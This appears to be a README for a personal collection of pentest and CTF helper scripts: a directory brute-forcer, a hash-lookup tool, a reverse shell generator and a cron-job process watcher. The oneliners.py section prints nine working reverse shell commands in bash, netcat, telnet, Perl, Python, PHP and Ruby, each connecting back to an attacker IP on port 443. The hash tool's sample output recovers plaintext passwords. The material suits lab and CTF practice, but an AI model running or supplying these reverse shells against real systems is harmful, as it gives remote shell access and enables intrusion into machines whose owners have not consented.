# pentest-scripts
Simple Python scripts that make my life a little easier during CTFs and OSCP.

## dirbuster.py
Gobuster, but much less robust and slightly faster, written in Python 3. Wrote it just to try out threading in Python. 

### Usage
```text
$ python3 dirbuster.py -u https://www.webscantest.com -w /usr/share/wordlists/dirb/common.txt -t 20

https://www.webscantest.com/.htaccess (403)
https://www.webscantest.com/.hta (403)
https://www.webscantest.com/.htpasswd (403)
https://www.webscantest.com/business (301)
https://www.webscantest.com/cart (301)
https://www.webscantest.com/css (301)
https://www.webscantest.com/favicon.ico (200)
[snip]
```


## hashesorg.py
Uses [Hashes.org API](https://hashes.org/api.php) to retrieve plain text passwords from hashes. Obtain your personal API key from Settings and update the script:
```python
API_KEY = "" # Your API key goes here
```

### Usage

```text
$ python hashesorg.py cbfdac6008f9cab4083784cbd1874f76618d2a97 21232f297a57a5a743894a0e4a801fc3 b23ff3e07d395769c5c4fee569d85f64 4813494d137e1631bba301d5acab6e7bb7aa74ce118
5d456565ef51d737677b2

[+] Getting results from Hashes.org...

  cbfdac6008f9cab4083784cbd1874f76618d2a97 --> password123 (SHA1)
  21232f297a57a5a743894a0e4a801fc3 --> admin (MD5)
  b23ff3e07d395769c5c4fee569d85f64
  4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2 --> root (SHA256PLAIN)
```

## oneliners.py
Generates a list of reverse shell one-liners. All the one-liners are obtained from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

### Usage
```text
$ python oneliners.py

  LHOST: 10.10.14.7
  LPORT (default is 443):

bash -i >& /dev/tcp/10.10.14.7/443 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 443 >/tmp/f

nc -e /bin/sh 10.10.14.7 443

mknod backpipe p && nc 10.10.14.7 443 0<backpipe | /bin/sh 1>backpipe

mknod backpipe p && telnet 10.10.14.7 443 0<backpipe | /bin/sh 1>backpipe

perl -e 'use Socket;$i="10.10.14.7";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

php -r '$sock=fsockopen("10.10.14.7",443);exec("/bin/sh -i <&3 >&3 2>&3");'

ruby -rsocket -e'f=TCPSocket.open("10.10.14.7",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


## pswatch.py/pswatch3.py
Wrote it to detect cron jobs, specifically those in root's crontab, which is, by default, not readable by low privilege users. 

### Usage
```text
$ python pswatch.py -h
usage: pswatch.py [-h] [-i KEYWORDS]

Logging new processes

optional arguments:
  -h, --help   show this help message and exit
  -i KEYWORDS  Keywords to ignore. Ex: -i kworker,www-data
```
